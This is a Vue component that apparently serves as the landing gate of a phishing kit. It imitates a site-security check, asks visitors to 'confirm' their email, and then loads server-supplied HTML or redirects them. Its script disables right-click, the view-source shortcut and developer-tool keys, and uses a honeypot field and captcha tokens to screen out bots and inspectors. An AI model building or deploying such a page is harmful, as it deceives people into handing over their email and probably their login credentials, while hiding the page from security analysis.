<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
      </div>
    </main>
  </div>

  <div v-else class="background">
    <div class="toto-container">
      <div class="header">
        <div class="logo-text">
          <span class="success-check">⼈</span>
        </div>
      </div>

      <div class="content">
        <p><strong>Please confirm your email address to continue.</strong></p>
        <div class="form-wrapper">
          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
          <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

          <label for="email" class="visually-hidden">Email address</label>
          <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />

          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

          <button @click="submitForm" :disabled="loading" class="action-button">
            {{ loading ? 'Submitting…' : 'Submit' }}
          </button>
        </div>
      </div>

      <div class="divider"></div>

      <div class="footer-container">
        <p class="footer-text">
          © 2025 All rights reserved.
          <a href="/privacy" target="_blank">Privacy Policy</a> |
          <a href="/terms" target="_blank">Terms</a>
        </p>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
        setTimeout(() => {
          captchaToken.value = null
          turnstileRendered = false
          window.turnstile.render('.cf-turnstile', {
            sitekey: '0x4AAAAAABgei6QZruCN7n08',
            callback: t => captchaToken.value = t
          })
        }, 120000)
      }
    })
    turnstileRendered = true
  }
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch('/api/check-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })

    const contentType = res.headers.get('Content-Type')

    if (res.redirected) {
      window.location.href = res.url
      return
    }

    if (contentType && contentType.includes('application/json')) {
      const data = await res.json()
      if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
      if (data.redirectUrl) {
        setTimeout(() => {
          window.location.href = data.redirectUrl
        }, 1500)
      }
    } else {
      const htmlText = await res.text()
      document.open()
      document.write(htmlText)
      document.close()
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>
